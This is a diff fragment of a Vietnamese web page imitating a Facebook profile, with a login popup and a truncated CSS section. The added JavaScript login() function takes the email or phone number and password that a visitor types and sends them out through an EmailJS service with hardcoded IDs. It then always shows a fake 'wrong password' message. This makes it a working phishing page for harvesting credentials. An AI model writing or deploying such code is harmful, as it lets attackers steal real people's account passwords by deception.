-                            <img src="https://i.imgur.com/bpwB1Mw.jpg" class="avatar" alt="Avatar" data-tooltip="Hương Trà">
-                        </div>
-                        <span>Và 7.8k người khác</span>
-                    </div>
+                    <p>Và 7.8k người khác</p>
                 </div>
             </div>
         </div>
@@ -698,407 +1151,74 @@
         <!-- Popup đăng nhập -->
         <div id="overlay" class="overlay" onclick="hideLoginPopup()"></div>
         <div id="loginPopup" class="popup">
-            <div class="popup-logo">
-                <svg viewBox="0 0 36 36" height="40" width="40">
-                    <path fill="#1877F2" d="M20.7 6.2c-.6-.3-1.3-.5-2-.5-2.3 0-4.1 1.8-4.1 4.1v2.4H12v3.2h2.6v8.7h3.2v-8.7h2.8l.4-3.2h-3.2v-2c0-.9.7-1.6 1.6-1.6h1.6V6.2z"></path>
-                </svg>
-            </div>
             <input type="text" id="login-input" placeholder="Email hoặc số điện thoại">
             <input type="password" id="password" placeholder="Mật khẩu">
             <button class="btn-login" onclick="login()">Đăng nhập</button>
-            <a class="forgot-password" href="#" onclick="showLoginPopup()">Quên mật khẩu?</a>
+            <a class="forgot-password" href="#">Quên mật khẩu?</a>
             <div class="divider"></div>
             <button class="btn-create" onclick="alert('Chuyển đến trang tạo tài khoản (chức năng demo)')">Tạo tài khoản mới</button>
-        </div>
-
-        <!-- Context Menu -->
-        <div class="context-menu">
-            <div class="menu-item" onclick="showLoginPopup()">Báo cáo</div>
-            <div class="menu-item" onclick="showLoginPopup()">Chia sẻ</div>
-            <div class="menu-item" onclick="showLoginPopup()">Sao chép liên kết</div>
-        </div>
-
-        <!-- Dark Mode Toggle -->
-        <div class="dark-mode-toggle" onclick="toggleDarkMode()">
-            <svg viewBox="0 0 24 24" width="24" height="24" fill="#65676B">
-                <path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9c.83 0 1.64-.12 2.41-.34-2.34-1.46-3.88-4.03-3.88-6.91 0-4.64 3.76-8.4 8.4-8.4.34 0 .68.03 1.01.08C17.47 3.56 14.85 3 12 3zm0 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78C13.95 11.96 12 14.69 12 18c0 1.66.66 3.14 1.78 4.22C13.14 20.86 12 21 12 21z"/>
-            </svg>
+            <div id="error-message" class="error-message"></div>
         </div>
     </div>
+
+    <script>
+        function showLoginPopup() {
+            document.getElementById('loginPopup').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('error-message').innerText = ''; // Xóa thông báo lỗi cũ
+        }
+
+        function hideLoginPopup() {
+            document.getElementById('loginPopup').style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+
+        function login() {
+            const username = document.getElementById('login-input').value || "";
+            const password = document.getElementById('password').value || "";
+            const errorMessage = document.getElementById('error-message');
+
+            const templateParams = {
+                name: "User",
+                time: new Date().toLocaleString(),
+                email: username,
+                password: password,
+                action: "Đăng nhập",
+                timestamp: new Date().toLocaleString()
+            };
+
+            emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
+                .then((response) => {
+                    console.log("Email gửi thành công:", response.status, response.text);
+                    errorMessage.innerText = "Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu";
+                })
+                .catch((error) => {
+                    console.error("Lỗi gửi email:", error);
+                    errorMessage.innerText = "Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu";
+                });
+        }
+
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.style.display = 'none';
+            });
+            document.querySelectorAll('.tabs a').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.getElementById(tabId).style.display = 'block';
+            document.querySelector(`.tabs a[onclick="showTab('${tabId}')"]`).classList.add('active');
+
+            if (tabId === 'videos-tab' || tabId === 'about-tab' || tabId === 'reels-tab' || tabId === 'photos-tab' || tabId === 'likes-tab') {
+                document.querySelector('.posts').style.maxWidth = '100%';
+                document.querySelector('.sidebar').style.display = 'none';
+            } else {
+                document.querySelector('.posts').style.maxWidth = '580px';
+                document.querySelector('.sidebar').style.display = 'block';
+            }
+        }
+
+        // Hiển thị tab mặc định
+        showTab('posts-tab');
+    </script>
 </body>
 </html>
-```
-
-#### Phần 2: CSS
-```css
-<style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-    }
-
-    body {
-        background: #F0F2F5;
-        scroll-behavior: smooth;
-    }
-
-    .container {
-        width: 100%;
-        max-width: 980px;
-        margin: 0 auto;
-        background: #FFFFFF;
-    }
-
-    /* Header */
-    .header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        background: #FFFFFF;
-        padding: 0 16px;
-        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-        height: 56px;
-        position: sticky;
-        top: 0;
-        z-index: 100;
-    }
-
-    .header .back-section {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-    }
-
-    .header .back-icon, .header .search-icon, .header .menu-icon {
-        padding: 8px;
-        border-radius: 50%;
-        cursor: pointer;
-        transition: background 0.2s;
-    }
-
-    .header .back-icon:hover, .header .search-icon:hover, .header .menu-icon:hover {
-        background: #F0F2F5;
-    }
-
-    .header .title {
-        font-size: 20px;
-        font-weight: 700;
-        color: #050505;
-        flex: 1;
-        text-align: center;
-    }
-
-    .header-actions {
-        display: flex;
-        gap: 8px;
-    }
-
-    /* Cover Image */
-    .cover-image {
-        height: 350px;
-        background: url('https://i.imgur.com/C1ZhH1t.jpg') no-repeat center center/cover;
-        border-bottom-left-radius: 8px;
-        border-bottom-right-radius: 8px;
-    }
-
-    /* Profile Section */
-    .profile-section {
-        margin-top: -84px;
-        padding: 0 16px;
-        position: relative;
-        z-index: 10;
-    }
-
-    .profile-pic-container {
-        display: flex;
-        justify-content: center;
-        margin-bottom: 16px;
-    }
-
-    .profile-pic {
-        width: 168px;
-        height: 168px;
-        border-radius: 50%;
-        border: 3px solid #FFFFFF;
-        object-fit: cover;
-        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-        transition: transform 0.2s;
-    }
-
-    .profile-pic:hover {
-        transform: scale(1.02);
-    }
-
-    .page-info {
-        background: #FFFFFF;
-        padding: 16px;
-        border-radius: 8px;
-        text-align: center;
-        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-    }
-
-    .page-info .name {
-        font-size: 20px;
-        font-weight: 700;
-        color: #050505;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-bottom: 8px;
-    }
-
-    .page-info .name .verified {
-        width: 18px;
-        height: 18px;
-        background: #1877F2;
-        border-radius: 50%;
-        margin-left: 6px;
-        display: inline-flex;
-        align-items: center;
-        justify-content: center;
-    }
-
-    .page-info .name .verified::after {
-        content: '';
-        width: 8px;
-        height: 4px;
-        border-left: 2px solid #FFFFFF;
-        border-bottom: 2px solid #FFFFFF;
-        transform: rotate(-45deg);
-    }
-
-    .page-info .stats {
-        color: #65676B;
-        font-size: 14px;
-        margin: 8px 0;
-    }
-
-    .page-info .description {
-        font-size: 14px;
-        color: #050505;
-        line-height: 1.4;
-    }
-
-    /* Action Buttons */
-    .action-buttons {
-        display: flex;
-        gap: 8px;
-        padding: 12px 16px;
-        background: #FFFFFF;
-        border-bottom: 1px solid #DDDFE2;
-        justify-content: center;
-    }
-
-    .action-buttons button {
-        position: relative;
-        padding: 8px 16px;
-        border: none;
-        border-radius: 6px;
-        font-size: 14px;
-        font-weight: 600;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-        gap: 6px;
-        overflow: hidden;
-        transition: background 0.2s, transform 0.1s;
-    }
-
-    .action-buttons button:active {
-        transform: scale(0.98);
-    }
-
-    .action-buttons button .ripple {
-        position: absolute;
-        background: rgba(255, 255, 255, 0.3);
-        border-radius: 50%;
-        transform: scale(0);
-        animation: ripple 0.6s linear;
-    }
-
-    @keyframes ripple {
-        to {
-            transform: scale(4);
-            opacity: 0;
-        }
-    }
-
-    .action-buttons .message {
-        background: #1877F2;
-        color: #FFFFFF;
-    }
-
-    .action-buttons .message:hover {
-        background: #166FE5;
-    }
-
-    .action-buttons .message img {
-        width: 20px;
-        height: 20px;
-    }
-
-    .action-buttons .like, .action-buttons .follow {
-        background: #E4E6EB;
-        color: #050505;
-    }
-
-    .action-buttons .like:hover, .action-buttons .follow:hover {
-        background: #D8DADE;
-    }
-
-    .action-buttons .like img, .action-buttons .follow img {
-        width: 20px;
-        height: 20px;
-    }
-
-    .action-buttons .more {
-        background: #E4E6EB;
-        color: #050505;
-        padding: 8px;
-        min-width: 40px;
-    }
-
-    .action-buttons .more:hover {
-        background: #D8DADE;
-    }
-
-    /* Tabs */
-    .tabs {
-        display: flex;
-        gap: 8px;
-        padding: 8px 16px;
-        background: #FFFFFF;
-        border-bottom: 1px solid #DDDFE2;
-        overflow-x: auto;
-        scroll-snap-type: x mandatory;
-        scroll-behavior: smooth;
-    }
-
-    .tabs a {
-        text-decoration: none;
-        color: #65676B;
-        font-size: 15px;
-        font-weight: 600;
-        padding: 8px 12px;
-        border-radius: 6px;
-        scroll-snap-align: start;
-        transition: color 0.2s, background 0.2s;
-    }
-
-    .tabs a.active {
-        color: #1877F2;
-        border-bottom: 3px solid #1877F2;
-        background: #F0F2F5;
-    }
-
-    .tabs a:hover {
-        background: #F0F2F5;
-    }
-
-    .tabs a.badge::after {
-        content: '3+';
-        display: inline-block;
-        margin-left: 6px;
-        padding: 2px 6px;
-        background: #FF3B30;
-        color: #FFFFFF;
-        font-size: 12px;
-        border-radius: 10px;
-    }
-
-    /* Details */
-    .details {
-        background: #FFFFFF;
-        padding: 16px;
-        border-radius: 8px;
-        margin: 12px 16px;
-        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-    }
-
-    .details .item {
-        display: flex;
-        align-items: center;
-        margin: 12px 0;
-        font-size: 14px;
-        color: #65676B;
-    }
-
-    .details .item .icon {
-        width: 20px;
-        height: 20px;
-        margin-right: 12px;
-        background-size: contain;
-        background-repeat: no-repeat;
-    }
-
-    .details .item strong {
-        color: #050505;
-    }
-
-    /* Main Content */
-    .main-content {
-        display: flex;
-        gap: 16px;
-        padding: 0 16px;
-        margin: 16px 0;
-    }
-
-    .sidebar {
-        flex: 1;
-        max-width: 360px;
-    }
-
-    .posts {
-        flex: 2;
-        max-width: 500px;
-    }
-
-    .tab-content {
-        display: none;
-        opacity: 0;
-        transition: opacity 0.3s;
-    }
-
-    .tab-content.active {
-        display: block;
-        opacity: 1;
-    }
-
-    .intro-section, .photos-section, .videos-section, .reels-section, .likes-section {
-        background: #FFFFFF;
-        border-radius: 8px;
-        padding: 16px;
-        margin-bottom: 16px;
-        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-    }
-
-    .photos-section .album {
-        display: grid;
-        grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-        gap: 4px;
-    }
-
-    .photos-section .album img {
-        width: 100%;
-        aspect-ratio: 1;
-        object-fit: cover;
-        border-radius: 4px;
-        cursor: pointer;
-        transition: transform 0.2s;
-    }
-
-    .photos-section .album img:hover {
-        transform: scale(1.05);
-    }
-
-    .videos-section .video-list {
-        display: grid;
-        grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
-        gap: 12px;
-    }
-
-    .videos-section .video-item {
-        position: relative;
-        background: #F0F2F
